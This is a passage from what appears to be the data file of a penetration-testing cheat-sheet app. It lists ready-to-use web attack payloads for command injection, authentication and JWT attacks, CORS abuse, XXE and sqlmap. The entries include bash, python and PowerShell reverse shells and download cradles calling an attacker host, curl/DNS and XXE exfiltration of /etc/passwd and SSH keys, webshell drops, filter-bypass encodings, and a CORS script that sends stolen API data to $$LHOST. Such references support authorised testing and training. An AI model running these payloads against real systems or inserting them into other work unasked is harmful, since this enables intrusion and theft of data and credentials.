          { id: "ssrf-bl3", label: "Internal network scan", os: "Both", command: "http://10.0.0.1/\nhttp://192.168.1.1/\nhttp://172.16.0.1/", notes: "Use with Burp Intruder/ffuf to scan entire subnet. Different response = live host." },
        ],
      },
    ],
  },
  {
    id: 'web-cmdi',
    name: 'Command Injection',
    icon: '💻',
    techniques: [
      {
        id: 'cmdi-det',
        name: 'Detection',
        commands: [
          { id: "cmdi1", label: "Injection operators", os: "Both", command: "; id\n| id\n&& id\n`id`\n$(id)\n|| id\n& id", notes: "Append to or replace normal input values. Try all operators — each has different execution semantics." },
          { id: "cmdi2", label: "Blind — ping test", os: "Both", command: "; ping -c 4 $$LHOST\n| ping -c 4 $$LHOST\n$(ping -c 4 $$LHOST)", notes: "Catch on attacker: tcpdump -i tun0 icmp. ICMP response confirms blind execution." },
          { id: "cmdi3", label: "Blind — OOB exfiltration", os: "Both", command: "; curl http://$$LHOST/?cmd=$(id|base64)\n; curl http://$$LHOST/?cmd=$(cat /etc/passwd|base64)\n; nslookup $(whoami).$$LHOST", notes: "Use base64 to avoid URL issues with special chars. Catch with nc -lvnp 80 or Burp Collaborator." },
          { id: "cmdi-d1", label: "Time-based blind confirm", os: "Both", command: "; sleep 5\n| sleep 5\n$(sleep 5)\n`sleep 5`", notes: "5-second page delay confirms blind execution when OOB callbacks are blocked." },
        ],
      },
      {
        id: 'cmdi-exp',
        name: 'Exploitation',
        commands: [
          { id: "cmdi5", label: "commix scan", os: "Linux", command: "commix -u \"$$URL/page.php?input=test\" --all", notes: "Automated command injection exploitation — auto-detects type and executes. Add --os-cmd for single cmd." },
          { id: "cmdi6", label: "Reverse shell (bash)", os: "Linux", command: "bash -c \"bash -i >& /dev/tcp/$$LHOST/$$LPORT 0>&1\"", notes: "URL-encode the full payload before injecting. Catch with: nc -lvnp $$LPORT" },
          { id: "cmdi-e1", label: "Reverse shell (python)", os: "Linux", command: "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$$LHOST\",$$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'", notes: "Useful when bash is restricted. Also try: python3 -c 'import os; os.system(\"id\")'" },
          { id: "cmdi-e2", label: "Read sensitive files", os: "Both", command: "; cat /etc/passwd\n; cat /etc/shadow\n; cat ~/.ssh/id_rsa\n; env\n; printenv", notes: "Start with read before attempting reverse shells — often enough to prove impact." },
        ],
      },
      {
        id: 'cmdi-bypass',
        name: 'Filter Bypass',
        commands: [
          { id: "cmdi4", label: "Space alternatives", os: "Both", command: "{cat,/etc/passwd}\ncat${IFS}/etc/passwd\ncat%09/etc/passwd\nX=$'cat\\x20/etc/passwd';$X", notes: "${IFS} = Internal Field Separator (space). %09 = tab. Brace syntax eliminates spaces." },
          { id: "cmdi-b1", label: "Command name bypass", os: "Both", command: "c$()at /etc/passwd\nc\\at /etc/passwd\n/???/c?t /etc/passwd\n/usr/bin/c?t /etc/passwd", notes: "Shell interpolation ($()) and wildcard ? bypass keyword blacklists." },
          { id: "cmdi-b2", label: "Encoding bypass", os: "Both", command: "$(printf '\\x63\\x61\\x74 /etc/passwd')\n$(echo 'Y2F0IC9ldGMvcGFzc3dk'|base64 -d|sh)", notes: "Hex or base64 encode the command to bypass string matching." },
          { id: "cmdi-b3", label: "Semicolon / newline bypass", os: "Both", command: "cmd1%0acmd2\ncmd1%3bcmd2\ncmd1;#comment\ncmd1\ncmd2", notes: "%0a = newline, %3b = semicolon. Some WAFs block ; but not newlines." },
        ],
      },
      {
        id: 'cmdi-blind',
        name: 'Blind & OOB',
        commands: [
          { id: "cmdi-o1", label: "DNS exfiltration", os: "Linux", command: "; nslookup $(whoami).$$LHOST\n; nslookup $(cat /etc/hostname).$$LHOST", notes: "DNS callbacks work through restrictive egress. Use Burp Collaborator or interactsh for catching." },
          { id: "cmdi-o2", label: "HTTP callback with data", os: "Linux", command: "; curl -s \"http://$$LHOST:$$LPORT/?data=$(cat /etc/passwd|base64 -w0)\"", notes: "Base64 -w0 prevents line wrapping. Decode on attacker: echo 'B64DATA' | base64 -d" },
          { id: "cmdi-o3", label: "Write webshell", os: "Linux", command: "; echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php", notes: "If web root is writable, drop a PHP shell for easier access." },
          { id: "cmdi-o4", label: "interactsh listener", os: "Linux", command: "interactsh-client\n# Then inject: ; curl https://YOUR-ID.oast.fun/$(id|base64)", notes: "Catch DNS and HTTP callbacks from blind injection without exposing your IP." },
        ],
      },
    ],
  },
  {
    id: 'web-auth',
    name: 'Broken Authentication',
    icon: '🔐',
    techniques: [
      {
        id: 'auth-brute',
        name: 'Brute Force',
        commands: [
          { id: "auth1", label: "Default credentials", os: "Both", command: "admin:admin\nadmin:password\nadmin:1234\nroot:root\nguest:guest\ntest:test\nadmin:(blank)", notes: "Always try before brute-forcing." },
          { id: "auth2", label: "Hydra HTTP form brute", os: "Linux", command: "hydra -L users.txt -P $$WORDLIST $$IP http-post-form \"/login:username=^USER^&password=^PASS^:Invalid credentials\"", notes: "Adjust POST params and failure string to match the target." },
          { id: "auth3", label: "ffuf login brute", os: "Linux", command: "ffuf -u http://$$IP/login -X POST -d \"user=admin&pass=FUZZ\" -w $$WORDLIST -fc 302", notes: "-fc 302 filters redirects (wrong password response)." },
        ],
      },
      {
        id: 'auth-jwt',
        name: 'JWT Attacks',
        commands: [
          { id: "auth4", label: "JWT decode", os: "Linux", command: "echo 'eyJ...' | cut -d'.' -f2 | base64 -d 2>/dev/null | jq .", notes: "Or paste at jwt.io to inspect header and payload without server-side requests." },
          { id: "auth5", label: "JWT none algorithm", os: "Both", command: "# Set alg to none, remove signature:\nHeader: {\"alg\":\"none\",\"typ\":\"JWT\"}\nPayload: {\"sub\":\"admin\",\"role\":\"admin\"}\n# Token = base64(header).base64(payload).", notes: "Some libraries accept unsigned tokens when alg=none. Also try: \"alg\":\"NONE\", \"alg\":\"None\"" },
          { id: "auth6", label: "JWT secret brute", os: "Linux", command: "hashcat -m 16500 'eyJ...full.token.here' $$WORDLIST\njohn --wordlist=$$WORDLIST --format=HMAC-SHA256 jwt.txt", notes: "Mode 16500 = JWT HMAC-SHA256. Use cracked secret to forge tokens at jwt.io." },
          { id: "auth7", label: "JWT kid path traversal", os: "Both", command: "# Set kid to a controlled file:\nHeader: {\"alg\":\"HS256\",\"kid\":\"../../dev/null\"}\n# Sign with empty string as secret", notes: "If kid resolves to /dev/null, the secret becomes empty string. Also try kid pointing to a writable file." },
          { id: "auth-j1", label: "RS256 → HS256 confusion", os: "Both", command: "# Change header: {\"alg\":\"HS256\"}\n# Sign with the server's RSA PUBLIC KEY as the HMAC secret", notes: "If server uses RS256 and accepts HS256, the public key (which is known) becomes the HMAC secret." },
        ],
      },
      {
        id: 'auth-session',
        name: 'Session Attacks',
        commands: [
          { id: "auth-s1", label: "Session fixation", os: "Both", command: "# 1. Get a pre-auth session:\ncurl -c cookies.txt $$URL/login\n# 2. Force victim to use it (via URL param or link):\n$$URL/login?sessionid=ATTACKER_SESSION\n# 3. After victim logs in, your session is now authenticated", notes: "Works when server accepts externally supplied session IDs." },
          { id: "auth-s2", label: "Session token analysis", os: "Linux", command: "# Collect tokens across multiple accounts:\nfor i in 1 2 3 4 5; do curl -s -c - $$URL/login | grep -i session; done", notes: "Look for patterns, sequential IDs, or base64-encoded predictable values." },
          { id: "auth-s3", label: "Cookie flag inspection", os: "Linux", command: "curl -I $$URL | grep -i set-cookie", notes: "Missing Secure → transmittable over HTTP. Missing HttpOnly → accessible via JS. Missing SameSite → CSRF." },
          { id: "auth-s4", label: "CSRF token bypass", os: "Both", command: "# 1. Check if CSRF token validated server-side\n# 2. Try: removing token, using another user's token, changing token to all zeros\n# 3. Check if Referer is accepted instead", notes: "Many CSRF \"protections\" are client-side only and not validated server-side." },
        ],
      },
      {
        id: 'auth-oauth',
        name: 'OAuth & SSO',
        commands: [
          { id: "auth-o1", label: "Open redirect in redirect_uri", os: "Both", command: "$$URL/oauth/authorize?client_id=CLIENT&redirect_uri=https://evil.com&response_type=code", notes: "If redirect_uri is not strictly validated, attacker gets the authorization code sent to evil.com." },
          { id: "auth-o2", label: "State parameter CSRF", os: "Both", command: "# Initiate OAuth without state param:\n$$URL/oauth/authorize?client_id=CLIENT&redirect_uri=CALLBACK&response_type=code\n# No state = no CSRF protection on the OAuth flow", notes: "Missing or reused state enables CSRF — force victim to link attacker's account." },
          { id: "auth-o3", label: "Token leakage via Referer", os: "Both", command: "# If access_token appears in URL fragment and page has external resources:\n$$URL/callback#access_token=TOKEN\n# Token appears in Referer header when clicking external links", notes: "Implicit flow puts tokens in URL fragments — avoid in modern OAuth." },
          { id: "auth-o4", label: "Account linking abuse", os: "Both", command: "# Log in as victim, initiate OAuth link flow\n# Intercept before redirect, steal code\n# Link code to attacker account instead", notes: "OAuth account linking flows are often poorly protected against CSRF and redirect manipulation." },
        ],
      },
    ],
  },
  {
    id: 'web-idor',
    name: 'IDOR / Broken Access Control',
    icon: '👤',
    techniques: [
      {
        id: 'idor-param',
        name: 'Parameter Manipulation',
        commands: [
          { id: "idor1", label: "IDOR fuzz IDs", os: "Linux", command: "ffuf -u '$$URL/api/user/FUZZ/profile' -w <(seq 1 1000) -mc 200", notes: "Also try GUIDs/UUIDs found in earlier responses." },
          { id: "idor2", label: "Forced browsing", os: "Linux", command: "ffuf -u $$URL/FUZZ -w $$WORDLIST -mc 200", notes: "Find unlinked admin pages and sensitive files." },
          { id: "idor3", label: "HTTP method override", os: "Both", command: "X-HTTP-Method-Override: DELETE\nX-HTTP-Method-Override: PUT\n# Or via URL param: ?_method=DELETE", notes: "Some servers respect override headers even when the method is blocked." },
        ],
      },
      {
        id: 'idor-priv',
        name: 'Privilege Escalation',
        commands: [
          { id: "idor4", label: "Mass assignment test", os: "Both", command: "{\"username\":\"user\",\"role\":\"admin\"}\n{\"username\":\"user\",\"isAdmin\":true}\n{\"username\":\"user\",\"balance\":99999}", notes: "Add privileged fields to POST/PUT body — ORMs (Rails, Django, Laravel) may bind all submitted fields." },
          { id: "idor5", label: "Vertical privilege escalation", os: "Both", command: "# Using low-priv token, request admin endpoints:\nGET /api/admin/users\nGET /api/admin/settings\nPOST /api/admin/user/delete", notes: "Replay captured admin requests with user-level session in Burp Repeater." },
        ],
      },
      {
        id: 'idor-cors',
        name: 'CORS Abuse',
        commands: [
          { id: "idor-c1", label: "CORS misconfiguration test", os: "Linux", command: "curl -I -H \"Origin: https://evil.com\" $$URL/api/user\ncurl -I -H \"Origin: null\" $$URL/api/user", notes: "Check Access-Control-Allow-Origin response header. If it reflects evil.com → CORS exploit possible." },
          { id: "idor-c2", label: "CORS PoC (steal data)", os: "Both", command: "<script>\nfetch('$$URL/api/user', {credentials: 'include'})\n  .then(r => r.text())\n  .then(d => fetch('http://$$LHOST/?data='+btoa(d)));\n</script>", notes: "If ACAO reflects attacker origin and ACAC: true is set, this steals authenticated API responses." },
          { id: "idor-c3", label: "CORS null origin bypass", os: "Both", command: "<iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" src=\"data:text/html,<script>fetch('$$URL/api/user',{credentials:'include'}).then(r=>r.text()).then(d=>location='http://$$LHOST/?x='+btoa(d))</script>\">", notes: "data: URI sends Origin: null. If server allows null origin → exfil via iframe sandbox." },
        ],
      },
      {
        id: 'idor-mass',
        name: 'Mass Assignment',
        commands: [
          { id: "idor-m1", label: "Add unlisted fields to request", os: "Both", command: "# Registration request:\nPOST /api/register\n{\"email\":\"x@x.com\",\"password\":\"pass\",\"role\":\"admin\",\"isAdmin\":true,\"verified\":true}", notes: "Add any fields found in GET responses to POST/PUT bodies. Frameworks often auto-bind all." },
          { id: "idor-m2", label: "Discover bindable fields (GET)", os: "Both", command: "# GET profile to see all model fields:\nGET /api/user/me → {\"id\":1,\"email\":\"...\",\"role\":\"user\",\"isAdmin\":false,\"credits\":100}", notes: "Fields shown in GET responses are often bindable in POST/PUT. Try setting each to privileged value." },
          { id: "idor-m3", label: "Update hidden fields", os: "Both", command: "PUT /api/user/$$USER_ID\n{\"email\":\"x@x.com\",\"balance\":99999,\"role\":\"admin\"}", notes: "Profile update endpoints are the most common mass assignment vector — not just registration." },
        ],
      },
    ],
  },
  {
    id: 'web-xxe',
    name: 'XXE Injection',
    icon: '📜',
    techniques: [
      {
        id: 'xxe-read',
        name: 'File Read & SSRF',
        commands: [
          { id: "xxe1", label: "Basic file read (Linux)", os: "Both", command: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>&xxe;</root>", notes: "Replace existing XML body in Burp with this payload." },
          { id: "xxe2", label: "Windows file read", os: "Both", command: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">\n]>\n<root>&xxe;</root>", notes: "Also try: file:///c:/inetpub/wwwroot/web.config" },
          { id: "xxe3", label: "XXE to SSRF", os: "Both", command: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">\n]>\n<root>&xxe;</root>", notes: "Combine with SSRF targets: 169.254.169.254 (AWS metadata), internal services via http://." },
          { id: "xxe-r1", label: "PHP source via expect://", os: "Both", command: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"expect://id\">\n]>\n<root>&xxe;</root>", notes: "expect:// executes system commands. Rarely enabled but worth trying." },
          { id: "xxe-r2", label: "PHP source via php://filter", os: "Both", command: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">\n]>\n<root>&xxe;</root>", notes: "php:// wrappers work in XXE if PHP stream wrappers are allowed by the parser." },
        ],
      },
      {
        id: 'xxe-blind',
        name: 'Blind OOB Exfiltration',
        commands: [
          { id: "xxe4", label: "Blind XXE (parameter entity)", os: "Both", command: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY % dtd SYSTEM \"http://$$LHOST/evil.dtd\">\n  %dtd;\n]>\n<root>&send;</root>\n\n# evil.dtd (serve with python3 -m http.server 80):\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % wrap \"<!ENTITY send SYSTEM 'http://$$LHOST/?x=%file;'>\">\n%wrap;", notes: "Two-stage OOB: load external DTD, which defines an entity that exfils file content via HTTP." },
          { id: "xxe-b1", label: "Blind XXE via DNS", os: "Both", command: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY % dtd SYSTEM \"http://$$LHOST.oast.fun/\">\n  %dtd;\n]>\n<root></root>", notes: "Confirms blind XXE via DNS/HTTP callback. Use Burp Collaborator or interactsh." },
          { id: "xxe-b2", label: "Error-based XXE", os: "Both", command: "# evil.dtd:\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % err \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">\n%err;\n%error;", notes: "File content appears in the error message — no OOB connection required." },
        ],
      },
      {
        id: 'xxe-svg',
        name: 'SVG & Alternative Vectors',
        commands: [
          { id: "xxe5", label: "XXE in SVG upload", os: "Both", command: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<svg xmlns=\"http://www.w3.org/2000/svg\">\n  <text>&xxe;</text>\n</svg>", notes: "Upload as .svg if the app renders SVG images server-side. Also try docx/xlsx which are XML zips." },
          { id: "xxe-sv1", label: "DOCX/XLSX (Office XML)", os: "Linux", command: "# Unzip docx:\nunzip -d docx original.docx\n# Edit word/document.xml — inject entity at top:\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n# Reference &xxe; inside body text\n# Repack:\ncd docx && zip -r ../evil.docx .", notes: "Office files are ZIP archives of XML. If app parses docx server-side → XXE possible." },
          { id: "xxe-sv2", label: "SAML-based XXE", os: "Both", command: "# Intercept SAML assertion in Burp:\n# Base64 decode → inject XXE entity into XML\n# Re-encode and replay", notes: "SAML assertions are XML and often parsed with external entity support enabled. High impact if found." },
        ],
      },
      {
        id: 'xxe-bypass',
        name: 'Filter Bypass',
        commands: [
          { id: "xxe-fb1", label: "Encoding bypass", os: "Both", command: "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>&xxe;</root>", notes: "UTF-16 encoding bypasses WAFs that search for DOCTYPE keyword in UTF-8." },
          { id: "xxe-fb2", label: "DOCTYPE in attribute", os: "Both", command: "<?xml version=\"1.0\"?>\n<root attr=\"&xxe;\"><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]></root>", notes: "Reorder elements — some parsers accept DOCTYPE after the root element." },
          { id: "xxe-fb3", label: "XInclude (no DOCTYPE needed)", os: "Both", command: "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\">\n  <xi:include parse=\"text\" href=\"file:///etc/passwd\"/>\n</foo>", notes: "XInclude doesn't need DOCTYPE. Works when you can only control part of the XML body." },
          { id: "xxe-fb4", label: "Nested entity bypass", os: "Both", command: "<!ENTITY % a \"<!ENTITY b SYSTEM 'file:///etc/passwd'>\">\n%a;\n&b;", notes: "Some parsers reject direct nested entities but allow parameterized expansion." },
        ],
      },
    ],
  },


  /* ── 17. sqlmap Tool ─────────────────────────────────────────────────── */
  {
    id: 'sqlmap',
    name: 'sqlmap Tool',
    icon: '🗃️',
    techniques: [
      {
        id: 'sqlmap-detect',
        name: 'Detection & Fingerprinting',
        description: 'Identify injection points and determine the database engine.',
        tags: ['web', 'sqli', 'sqlmap'],
                subtechniques: [
          {
            id: "smd-inp",
            name: "Input Methods",
            commands: [
            { id: "sm_d1", label: "Basic scan (GET)", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --batch", notes: "--batch auto-answers all prompts. Good starting point." },
            { id: "sm_d2", label: "Test specific parameter", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" -p $$VULN_PARAM --batch", notes: "Use -p when you already know which parameter is injectable." },
            { id: "sm_d3", label: "POST data scan", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --data=\"user=admin&pass=test\" -p $$VULN_PARAM --batch", notes: "Tests parameters in the POST body." },
            { id: "sm_d4", label: "From Burp request file", os: "Linux", command: "sqlmap -r /tmp/burp.req --batch", notes: "Most reliable method. Save from Burp: right-click → Save item." }
            ]
          },
          {
            id: "smd-fp",
            name: "Fingerprint & Thoroughness",
            commands: [
            { id: "sm_d5", label: "Banner + fingerprint", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --banner --current-user --current-db --hostname --batch", notes: "Confirms injection and grabs version, current user, and active DB in one shot." },
            { id: "sm_d6", label: "Force DBMS type", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --dbms=$$DB_TYPE --batch", notes: "Skip detection. Values: mysql, mssql, postgresql, oracle, sqlite." },
            { id: "sm_d7", label: "All injection techniques", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --technique=BEUSTQ --batch", notes: "B=boolean, E=error, U=union, S=stacked, T=time, Q=OOB. Default omits Q." },
            { id: "sm_d8", label: "High thoroughness", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --level=5 --risk=3 --batch", notes: "--level 5 tests User-Agent, Referer, cookies. --risk 3 enables heavy payloads." },
            { id: "sm_d9", label: "Identify WAF", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --identify-waf --batch", notes: "Detects common WAF products before choosing bypass strategy." }
            ]
          }
        ],
      },
      {
        id: 'sqlmap-enum',
        name: 'Enumeration',
        description: 'List databases, tables, columns, users, and privileges.',
        tags: ['web', 'sqli', 'sqlmap', 'database'],
                subtechniques: [
          {
            id: "sme-db",
            name: "Database Structure",
            commands: [
            { id: "sm_e1", label: "List all databases", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --dbs --batch", notes: "" },
            { id: "sm_e2", label: "List tables", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" -D $$DB_NAME --tables --batch", notes: "" },
            { id: "sm_e3", label: "List columns", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" -D $$DB_NAME -T $$DB_TABLE --columns --batch", notes: "" },
            { id: "sm_e4", label: "Full DB schema", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" -D $$DB_NAME --schema --batch", notes: "All tables and column definitions. More thorough than --tables." }
            ]
          },
          {
            id: "sme-usr",
            name: "Users & Search",
            commands: [
            { id: "sm_e5", label: "List users", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --users --batch", notes: "" },
            { id: "sm_e6", label: "Password hashes", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --passwords --batch", notes: "Dumps DB auth hashes and attempts to crack them inline." },
            { id: "sm_e7", label: "User privileges", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --privileges --batch", notes: "Identifies FILE, SUPER, EXECUTE — essential for RCE planning." },
            { id: "sm_e8", label: "Count rows before dump", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" -D $$DB_NAME -T $$DB_TABLE --count --batch", notes: "Estimate dump size before committing to --dump." },
            { id: "sm_e9", label: "Search tables by name", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --search -T $$DB_TABLE --batch", notes: "Find tables across all accessible databases." },
            { id: "sm_e10", label: "Search columns by name", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --search -C $$DB_COLUMN --batch", notes: "Search for \"password\", \"hash\", \"token\" across all tables." }
            ]
          }
        ],
      },
      {
        id: 'sqlmap-extract',
        name: 'Data Extraction',
        description: 'Dump table data, crack hashes, and run interactive SQL queries.',
        tags: ['web', 'sqli', 'sqlmap', 'database'],
                subtechniques: [
          {
            id: "smx-dump",
            name: "Dump Data",
            commands: [
            { id: "sm_x1", label: "Dump full table", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" -D $$DB_NAME -T $$DB_TABLE --dump --batch", notes: "" },
            { id: "sm_x2", label: "Dump specific columns", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" -D $$DB_NAME -T $$DB_TABLE -C \"$$DB_COLUMN\" --dump --batch", notes: "Faster — only fetches the columns you need." },
            { id: "sm_x3", label: "Dump with WHERE filter", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" -D $$DB_NAME -T $$DB_TABLE --where=\"id=1\" --dump --batch", notes: "Target specific rows with any valid SQL WHERE clause." },
            { id: "sm_x4", label: "Paginate rows", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" -D $$DB_NAME -T $$DB_TABLE --dump --start=1 --stop=50 --batch", notes: "Avoid dumping huge tables in one shot." },
            { id: "sm_x5", label: "Dump all tables in DB", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" -D $$DB_NAME --dump-all --batch", notes: "" },
            { id: "sm_x6", label: "Dump everything (skip sysdbs)", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --dump-all --exclude-sysdbs --batch", notes: "Skips information_schema, sys, master — targets only app data." }
            ]
          },
          {
            id: "smx-out",
            name: "Output & Shell",
            commands: [
            { id: "sm_x7", label: "Save to output directory", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" -D $$DB_NAME -T $$DB_TABLE --dump --output-dir=/tmp/sqlmap --batch", notes: "Results saved as CSV files for easy review." },
            { id: "sm_x8", label: "Interactive SQL shell", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --sql-shell --batch", notes: "Run arbitrary SQL queries through the injection point." }
            ]
          }
        ],
      },
      {
        id: 'sqlmap-fileops',
        name: 'File Operations',
        description: 'Read and write files on the server via SQL injection.',
        tags: ['web', 'sqli', 'sqlmap'],
                subtechniques: [
          {
            id: "smf-read",
            name: "Read Files",
            commands: [
            { id: "sm_f1", label: "Read /etc/passwd", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --file-read=\"/etc/passwd\" --batch", notes: "Requires FILE privilege (MySQL) or BULK rights (MSSQL)." },
            { id: "sm_f2", label: "Read Windows hosts", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --file-read=\"C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts\" --batch", notes: "" },
            { id: "sm_f3", label: "Read web.config (IIS)", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --file-read=\"C:\\\\inetpub\\\\wwwroot\\\\web.config\" --batch", notes: "Often contains DB connection strings and app secrets." },
            { id: "sm_f4", label: "Read PHP config", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --file-read=\"/var/www/html/config.php\" --batch", notes: "Also try: /var/www/html/wp-config.php, ../config.php" }
            ]
          },
          {
            id: "smf-write",
            name: "Write & Check",
            commands: [
            { id: "sm_f5", label: "Write PHP webshell", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --file-write=\"./shell.php\" --file-dest=\"/var/www/html/shell.php\" --batch", notes: "shell.php: <?php system($_GET[\"cmd\"]); ?>  Needs FILE priv + web root write access." },
            { id: "sm_f6", label: "Write ASPX webshell", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --file-write=\"./shell.aspx\" --file-dest=\"C:\\\\inetpub\\\\wwwroot\\\\shell.aspx\" --batch", notes: "" },
            { id: "sm_f7", label: "Check FILE privilege", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --privileges --batch", notes: "Look for FILE in output — required for read/write on MySQL." }
            ]
          }
        ],
      },
      {
        id: 'sqlmap-osshell',
        name: 'OS Command Execution',
        description: 'Execute operating system commands through the SQL injection.',
        tags: ['web', 'sqli', 'sqlmap', 'rce'],
                subtechniques: [
          {
            id: "smo-shell",
            name: "Shell & Commands",
            commands: [
            { id: "sm_o1", label: "Interactive OS shell", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --os-shell --batch", notes: "Tries xp_cmdshell (MSSQL), UDF injection (MySQL), COPY FROM PROGRAM (PostgreSQL)." },
            { id: "sm_o2", label: "Single OS command", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --os-cmd=\"id\" --batch", notes: "Faster than --os-shell for one-off commands. Try: id, whoami, hostname." },
            { id: "sm_o3", label: "Reverse shell (Linux)", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --os-cmd=\"bash -c 'bash -i >& /dev/tcp/$$LHOST/$$LPORT 0>&1'\" --batch", notes: "Start listener: nc -lvnp $$LPORT" },
            { id: "sm_o4", label: "Reverse shell (Windows PS)", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --os-cmd=\"powershell -nop -w hidden -c \\\"IEX(New-Object Net.WebClient).DownloadString('http://$$LHOST/shell.ps1')\\\"\" --batch", notes: "Host shell.ps1 via: python3 -m http.server 80" }
            ]
          },
          {
            id: "smo-adv",
            name: "Meterpreter & NTLM",
            commands: [
            { id: "sm_o5", label: "Meterpreter (os-pwn)", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --os-pwn --batch", notes: "Uploads and executes a Metasploit stager. Requires msf on $$LHOST." },
            { id: "sm_o6", label: "MSSQL NTLMv2 capture", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --sql-shell\n-- In shell: EXEC master..xp_dirtree '\\\\\\\\$$LHOST\\\\share'", notes: "Triggers SMB auth to attacker. Start Responder: responder -I eth0 -wrf" }
            ]
          }
        ],
      },
      {
        id: 'sqlmap-auth',
        name: 'Authentication Bypass',
        description: 'Test injection via cookies, tokens, custom headers, and auth schemes.',
        tags: ['web', 'sqli', 'sqlmap'],
                subtechniques: [
          {
            id: "sma-hdr",
            name: "Cookie & Header Auth",
            commands: [
            { id: "sm_a1", label: "Cookie injection", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --cookie=\"PHPSESSID=abc; id=1\" -p id --batch", notes: "" },
            { id: "sm_a2", label: "Cookie scan (auto level 2)", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --cookie=\"PHPSESSID=abc\" --level=2 --batch", notes: "--level 2+ automatically tests all cookie parameters." },
            { id: "sm_a3", label: "Custom header injection", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" -H \"X-Forwarded-For: 1*\" --level=3 --batch", notes: "Append * to mark the injection position in the header value." },
            { id: "sm_a4", label: "Bearer / JWT token", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" -H \"Authorization: Bearer <token>*\" --batch", notes: "" }
            ]
          },
          {
            id: "sma-cred",
            name: "Credentials & CSRF",
            commands: [
            { id: "sm_a5", label: "HTTP Basic auth", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --auth-type=Basic --auth-cred=\"$$USER:$$PASSWORD\" --batch", notes: "" },
            { id: "sm_a6", label: "POST + session cookie", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --data=\"user=admin&pass=test\" --cookie=\"PHPSESSID=abc\" --batch", notes: "Combine POST body with authenticated session cookie." },
            { id: "sm_a7", label: "Auto CSRF token refresh", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --data=\"$$VULN_PARAM=test\" --csrf-token=csrf_token --csrf-url=\"$$VULN_URL\" --batch", notes: "Replace csrf_token with the actual field name." }
            ]
          }
        ],
      },
      {
        id: 'sqlmap-bypass',
        name: 'WAF & Evasion',
        description: 'Tamper scripts, encoding, and rate-limiting to evade detection.',
        tags: ['web', 'sqli', 'sqlmap'],
                subtechniques: [
          {
            id: "smb-tamp",
            name: "Tamper Scripts",
            commands: [
